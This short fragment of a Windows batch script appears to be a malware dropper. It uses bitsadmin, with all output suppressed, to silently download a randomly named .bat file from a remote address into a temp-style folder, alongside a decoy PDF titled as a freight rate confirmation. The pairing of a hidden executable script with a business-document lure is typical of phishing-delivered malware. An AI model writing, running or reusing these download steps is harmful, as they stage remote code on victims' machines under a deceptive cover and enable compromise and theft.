...
echo.
echo  [bitsadmin] Downloading...
echo.

bitsadmin /transfer "d1" "%R%/wdsrpn43cdv.bat" "%T%\wdsrpn431cdv.bat" >nul 2>&1
bitsadmin /transfer "d2" "%R%/Rate_Confirmation_LD-2026-0847.pdf" "%D%\Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1
